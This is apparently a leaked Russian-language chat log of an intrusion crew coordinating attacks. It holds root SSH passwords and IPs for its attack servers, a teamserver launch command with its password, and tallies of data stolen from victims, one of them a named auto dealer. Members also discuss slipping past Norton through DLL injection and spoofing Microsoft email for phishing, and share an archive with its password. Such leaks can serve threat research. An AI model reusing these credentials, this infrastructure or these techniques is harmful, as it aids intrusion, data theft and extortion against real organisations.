+>>> Coba SERVER 4.8 TE <<<
+port: 40703
+ip/port: 142.93.146.149:40703
+ssh -p40703 root@142.93.146.149
+lEttEW4px1dyQiJCFGkurBevcbNwGLqsS5m
+
+COBA://142.93.146.149:43090
+7DaAHquB1Nz39bZBp4QxSJZqgdm7a46Pcq7
+
+./teamserver 142.93.146.149 7DaAHquB1Nz39bZBp4QxSJZqgdm7a46Pcq7 ./xxxx.profile
+----------------------------------------------------------------------------------------
+
+--------------------
+[2023-10-28 17:34:46] @usernameyy:matrix.bestflowers247.online: пока хз что там было
+--------------------
+[2023-10-28 17:34:59] @usernamehh:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> я вижу что была какая то ошибка, но почему то когда  я запустил всё ок)
+
+потому что ты гений
+--------------------
+[2023-10-28 17:35:04] @usernameyy:matrix.bestflowers247.online: азахахх
+--------------------
+[2023-10-28 17:35:10] @usernameyy:matrix.bestflowers247.online: магия просто
+--------------------
+[2023-10-28 17:35:20] @usernamehh:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> ```
+> >>> Coba PROXY <<<
+> port: 52331
+> ssh -p52331 root@143.198.42.55
+> TcokM9SEpYOlJEoyOAF5Pa47QAnzDWA8xo1
+> domain: foxye01o.net
+> https://foxye01o.net (Ports: 80,443,8080,8888,7575,4444)
+> ----------------------------------------------------------------------------------------
+> >>> Coba SERVER 4.8 TE <<<
+> port: 40703
+>   ip/port: 142.93.146.149:40703
+> ssh -p40703 root@142.93.146.149
+> lEttEW4px1dyQiJCFGkurBevcbNwGLqsS5m
+>
+> COBA://142.93.146.149:43090
+> 7DaAHquB1Nz39bZBp4QxSJZqgdm7a46Pcq7
+>
+> ./teamserver 142.93.146.149 7DaAHquB1Nz39bZBp4QxSJZqgdm7a46Pcq7 ./xxxx.profile
+> ----------------------------------------------------------------------------------------
+
+спасибо
+--------------------
+[2023-10-28 17:35:26] @usernameyy:matrix.bestflowers247.online: проверь ток сначала
+--------------------
+[2023-10-28 17:35:31] @usernameyy:matrix.bestflowers247.online: я пока поищу в чем проблема была
+--------------------
+[2023-10-28 17:35:43] @usernamehh:matrix.bestflowers247.online: хорошо
+--------------------
+[2023-10-28 17:37:58] @usernameyy:matrix.bestflowers247.online: а ты переустанавливал его?
+--------------------
+[2023-10-28 17:38:26] @usernameyy:matrix.bestflowers247.online: он почему то с первого раза не нашел дотнет nable to locate package dotnet-sdk-7.0
+--------------------
+[2023-10-28 17:38:31] @usernameyy:matrix.bestflowers247.online: мб инет там дропнулся конечно
+--------------------
+[2023-10-28 17:39:23] @usernamehh:matrix.bestflowers247.online: крайний раз, ничего не переустанавливал
+--------------------
+[2023-10-28 17:39:35] @usernamehh:matrix.bestflowers247.online: до этого пробовал по разному
+--------------------
+[2023-10-28 17:40:02] @usernameyy:matrix.bestflowers247.online: ок если нужна еще коба попробуй и предупреди меня
+--------------------
+[2023-10-28 17:40:09] @usernameyy:matrix.bestflowers247.online: добавил запасной метод загрузки
+--------------------
+[2023-10-28 17:40:27] @usernamehh:matrix.bestflowers247.online: хорошо
+--------------------
+[2023-10-28 18:41:04] @usernamegg:matrix.bestflowers247.online: ?
+--------------------
+[2023-10-28 18:41:17] @usernamegg:matrix.bestflowers247.online: ну что сколько скачалось ?
+--------------------
+[2023-10-28 18:41:41] @usernamejj:matrix.bestflowers247.online: там 62ГБ
+--------------------
+[2023-10-28 18:42:03] @usernamejj:matrix.bestflowers247.online: того FS сервера на хостах нет
+--------------------
+[2023-10-28 18:42:29] @usernamejj:matrix.bestflowers247.online: на все три хоста по рдп подключались
+--------------------
+[2023-10-28 18:49:25] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2023-10-28 19:53:21] @usernamegg:matrix.bestflowers247.online: привет
+--------------------
+[2023-10-28 19:53:50] @usernamegg:matrix.bestflowers247.online: нортон злоебучий
+--------------------
+[2023-10-28 19:54:02] @usernamegg:matrix.bestflowers247.online: там же не крипт
+--------------------
+[2023-10-28 19:54:19] @usernamegg:matrix.bestflowers247.online: там инжектировние в длл легетивную от майкрософт
+--------------------
+[2023-10-28 20:30:27] @usernamegg:matrix.bestflowers247.online: Cyber Symphony, [28 окт. 2023 г., 15:39:36]:
+Привет, почти закончил, скоро будет готово
+
+Cyber Symphony, [28 окт. 2023 г., 20:19:18]:
+У меня всё готово, полностью, нужно только ссылки поменять на скачку
+
+Дай знать как будешь готов, я скину покажу что как, или дай мне просто хостинг и домен
+
+я тебе туда установлю
+--------------------
+[2023-10-28 20:30:38] @usernamegg:matrix.bestflowers247.online: по ленду
+--------------------
+[2023-10-28 20:38:25] @usernameugway:matrix.bestflowers247.online: KJASNdckjnqkjvnkj421
+--------------------
+[2023-10-28 20:38:26] @usernameugway:matrix.bestflowers247.online: https://dropmefiles.com/47q4l
+--------------------
+[2023-10-28 20:41:36] @usernamehh:matrix.bestflowers247.online: 45.77.184.206:40831   NS-HYPER-V
+45.77.184.206:38009  LG-RDS01
+
+
+--------------------
+[2023-10-28 21:01:01] @usernamegg:matrix.bestflowers247.online: таак
+--------------------
+[2023-10-28 21:01:05] @usernamegg:matrix.bestflowers247.online: сколько скачали ?
+--------------------
+[2023-10-28 21:01:19] @usernamegg:matrix.bestflowers247.online: 2. AUTOSMIDTS autosmidts.local (Forest tree root) (Primary Domain) (Native) (Auto dealer) www.smidts.nl    ID: f41e13c7-16ee-4c98-b759-ce74827136f6
+
+--------------------
+[2023-10-28 21:01:28] @usernamegg:matrix.bestflowers247.online: вот по этим ребяткам еще сколько выкачали ?
+--------------------
+[2023-10-28 21:01:37] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2023-10-28 21:02:01] @usernamejj:matrix.bestflowers247.online: по текущей сетке 81ГБ, остальное дубли
+--------------------
+[2023-10-28 21:02:12] @usernameff:matrix.bestflowers247.online: посчет автошмитам хз, ХХ ничего не говорил
+--------------------
+[2023-10-28 21:02:22] @usernameff:matrix.bestflowers247.online: хз найдем ли у него там
+--------------------
+[2023-10-28 21:03:15] @usernamegg:matrix.bestflowers247.online: исследование спуфинг ru.rar
+--------------------
+[2023-10-28 21:03:16] @usernamegg:matrix.bestflowers247.online: KJASNdckjnqkjvnkj421
+
+--------------------
+[2023-10-28 21:05:17] @usernamegg:matrix.bestflowers247.online: это очень крутой матерьял который рассказывает вообще все что не понятно было до этого, я еще пару раз прочитать хочу его.
+я сейчас встречался с ребятами который по тимсу работаю, они его раскапали где то и мне показали. А помнишь у них был инбокс 10 из 10 ? они смотги заинбоксить на outlook  с подменой письма от офицальной почты майкрософт. ))))
+--------------------
+[2023-10-28 21:05:59] @usernamegg:matrix.bestflowers247.online: * это очень крутой матерьял который рассказывает вообще все что не понятно было до этого, я еще пару раз прочитать хочу его.
+я сейчас встречался с ребятами который по тимсу работаю, они его раскапали где то и мне показали. А помнишь у них был инбокс 10 из 10 ? они смотги заинбоксить на outlook  с подменой письма от офицальной почты майкрософт. )))) тут все рассказано в этом иследовании, тут рассказано вообще как все это зараждалось и работает. изучи обязательно за выхи.
+--------------------
+[2023-10-28 21:07:58] @usernameff:matrix.bestflowers247.online: он в целом по nicecloud говорил что около 1тб скачалось, но конкретно по какой сколько я не вижу где у него написано
+--------------------
+[2023-10-28 21:10:13] @usernamegg:matrix.bestflowers247.online: > <@usernamejj:matrix.bestflowers247.online> по текущей сетке 81ГБ, остальное дубли
+
+понял
+--------------------
+[2023-10-28 21:10:27] @usernamegg:matrix.bestflowers247.online: ладно поставите отпишите
+--------------------
+[2023-10-28 21:10:44] @usernamegg:matrix.bestflowers247.online: > <@usernameff:matrix.bestflowers247.online> он в целом по nicecloud говорил что около 1тб скачалось, но конкретно по какой сколько я не вижу где у него написано
+
+да да, надо изучать сидеть на фтп
+--------------------
+[2023-10-28 21:10:47] @usernamegg:matrix.bestflowers247.online: завтра займусь
+--------------------
+[2023-10-28 21:11:07] @usernameff:matrix.bestflowers247.online: ++
+--------------------
+[2023-10-28 22:21:07] @usernamejj:matrix.bestflowers247.online: все, поставили
+--------------------
+[2023-10-28 22:59:17] @usernamejj:matrix.bestflowers247.online: все, поставили
+--------------------
